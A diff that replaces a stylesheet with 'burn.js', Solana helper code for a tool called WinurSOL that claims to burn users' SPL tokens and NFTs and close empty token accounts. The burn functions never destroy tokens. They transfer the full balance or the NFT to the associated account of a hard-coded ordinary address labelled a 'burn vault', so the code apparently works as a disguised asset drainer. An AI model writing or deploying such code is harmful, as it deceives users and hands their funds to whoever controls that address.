@@ -1,6 +1,171 @@
-.burn-btn{position:relative;display:inline-flex;align-items:center;gap:8px;padding:10px 14px;background:linear-gradient(90deg,#ff416c,#ff4b2b);border:none;border-radius:8px;color:#fff;font-weight:700;cursor:pointer;overflow:hidden;box-shadow:0 6px 18px rgba(255,75,43,.25)}
-.burn-btn .flames{width:26px;height:26px;position:relative}
-.burn-btn .flames i{position:absolute;bottom:-2px;width:7px;height:16px;background:radial-gradient(circle at 50% 0%,#fff,transparent 30%),linear-gradient(#ffd54d,#ff6b00);border-radius:50% 50% 20% 20%;transform-origin:bottom center;animation:flicker 1s infinite ease-in-out;opacity:.95}
-.burn-btn .flames i:nth-child(2){left:6px;animation-delay:.15s;transform:scale(.9)}
-.burn-btn .flames i:nth-child(3){left:14px;animation-delay:.3s;transform:scale(.8)}
-@keyframes flicker{0%{transform:translateY(0) scaleY(1);opacity:1}50%{transform:translateY(-6px) scaleY(.85);opacity:.85}100%{transform:translateY(0) scaleY(1);opacity:1}}
+// burn.js — WinurSOL burn helpers (SPL tokens, NFT’ler, boş hesap kapatma)
+
+import {
+  Connection,
+  PublicKey,
+  SystemProgram,
+  Transaction,
+  TransactionInstruction,
+} from "@solana/web3.js";
+import {
+  getAssociatedTokenAddress,
+  getMint,
+  getAccount,
+  createTransferInstruction,
+  createCloseAccountInstruction,
+} from "@solana/spl-token";
+
+/**
+ * 🔥 TÜM YAKMA HEDEFİ (BURN VAULT)
+ * Bu adrese transfer edilen token/NFT’ler “yakılmış” kabul edilir.
+ */
+export const BURN_ADDRESS = new PublicKey(
+  "GiLefarGmT5zvaeiFiLNmrckRen3MNjrXQ8fHCtAdN3s"
+);
+
+/**
+ * Küçük yardımcı: tek transaction gönder
+ */
+export async function sendTx({ connection, wallet, ixs, signers = [] }) {
+  const tx = new Transaction().add(...ixs);
+  tx.feePayer = wallet.publicKey;
+  tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+  const signed = await wallet.signTransaction(tx);
+  const sig = await connection.sendRawTransaction(signed.serialize(), {
+    skipPreflight: false,
+  });
+  await connection.confirmTransaction(sig, "confirmed");
+  return sig;
+}
+
+/**
+ * Kaynaktaki SPL token bakiyesini BURN_ADDRESS’in ATA’sına taşır
+ * ve kaynak token hesabını kapatıp kira (rent) SOL’unu kullanıcıya iade eder.
+ *
+ * @param {Object} p
+ * @param {Connection} p.connection
+ * @param {import("@solana/wallet-adapter-react").WalletContextState} p.wallet
+ * @param {PublicKey} p.sourceTokenAccount Kullanıcının token hesabı (ATA)
+ * @param {PublicKey} p.mint Mint adresi
+ */
+export async function burnSplTokenAccount({ connection, wallet, sourceTokenAccount, mint }) {
+  if (!wallet?.publicKey) throw new Error("Wallet bağlı değil");
+
+  // Kaynak hesabı ve mint bilgileri
+  const [acc, mintInfo] = await Promise.all([
+    getAccount(connection, sourceTokenAccount),
+    getMint(connection, mint),
+  ]);
+
+  // Kaynak bakiyesi
+  const amount = acc.amount; // BigInt
+  if (amount === 0n) {
+    // Boşsa sadece kapat
+    const ix = createCloseAccountInstruction(
+      sourceTokenAccount,
+      wallet.publicKey,     // rent iadesi buraya
+      wallet.publicKey
+    );
+    return await sendTx({ connection, wallet, ixs: [ix] });
+  }
+
+  // Burn kasasının ATA'sı
+  const burnAta = await getAssociatedTokenAddress(mint, BURN_ADDRESS, true);
+
+  // 1) Tüm bakiyeyi burn kasasına transfer et
+  const transferIx = createTransferInstruction(
+    sourceTokenAccount,
+    burnAta,
+    wallet.publicKey,
+    amount
+  );
+
+  // 2) Kaynak hesabı kapat (rent iadesi)
+  const closeIx = createCloseAccountInstruction(
+    sourceTokenAccount,
+    wallet.publicKey,
+    wallet.publicKey
+  );
+
+  return await sendTx({ connection, wallet, ixs: [transferIx, closeIx] });
+}
+
+/**
+ * Tek bir NFT (decimals=0, amount=1) yak
+ * NFT’yi BURN_ADDRESS’in ATA’sına taşır ve kullanıcıdaki token hesabını kapatır.
+ *
+ * @param {Object} p
+ * @param {Connection} p.connection
+ * @param {import("@solana/wallet-adapter-react").WalletContextState} p.wallet
+ * @param {PublicKey} p.nftMint NFT mint adresi
+ * @param {PublicKey} p.ownerNftAta Kullanıcının NFT ATA’sı
+ */
+export async function burnNft({ connection, wallet, nftMint, ownerNftAta }) {
+  if (!wallet?.publicKey) throw new Error("Wallet bağlı değil");
+
+  const mintInfo = await getMint(connection, nftMint);
+  if (Number(mintInfo.decimals) !== 0) {
+    throw new Error("Bu yardımcı, decimals=0 (NFT) için tasarlandı.");
+  }
+
+  const ownerAtaAcc = await getAccount(connection, ownerNftAta);
+  if (ownerAtaAcc.amount === 0n) {
+    // Zaten boşsa sadece kapat
+    const ix = createCloseAccountInstruction(
+      ownerNftAta,
+      wallet.publicKey,
+      wallet.publicKey
+    );
+    return await sendTx({ connection, wallet, ixs: [ix] });
+  }
+
+  const burnAta = await getAssociatedTokenAddress(nftMint, BURN_ADDRESS, true);
+
+  const transferIx = createTransferInstruction(
+    ownerNftAta,
+    burnAta,
+    wallet.publicKey,
+    1n
+  );
+
+  const closeIx = createCloseAccountInstruction(
+    ownerNftAta,
+    wallet.publicKey,
+    wallet.publicKey
+  );
+
+  return await sendTx({ connection, wallet, ixs: [transferIx, closeIx] });
+}
+
+/**
+ * 0 bakiyeli (empty) token hesaplarını kapatarak kira SOL’unu iade eder.
+ *
+ * @param {Object} p
+ * @param {Connection} p.connection
+ * @param {import("@solana/wallet-adapter-react").WalletContextState} p.wallet
+ * @param {PublicKey[]} p.tokenAccounts Kullanıcıya ait token hesapları (ATA’lar)
+ */
+export async function closeEmptyTokenAccounts({ connection, wallet, tokenAccounts }) {
+  if (!wallet?.publicKey) throw new Error("Wallet bağlı değil");
+
+  const ixs = [];
+  for (const ata of tokenAccounts) {
+    try {
+      const acc = await getAccount(connection, ata);
+      if (acc.amount === 0n) {
+        ixs.push(
+          createCloseAccountInstruction(
+            ata,
+            wallet.publicKey,
+            wallet.publicKey
+          )
+        );
+      }
+    } catch (_) {
+      // Geçersiz hesap vs. görmezden gel
+    }
+  }
+
+  if (!ixs.length) return null;
+  return await sendTx({ connection, wallet, ixs });
+}
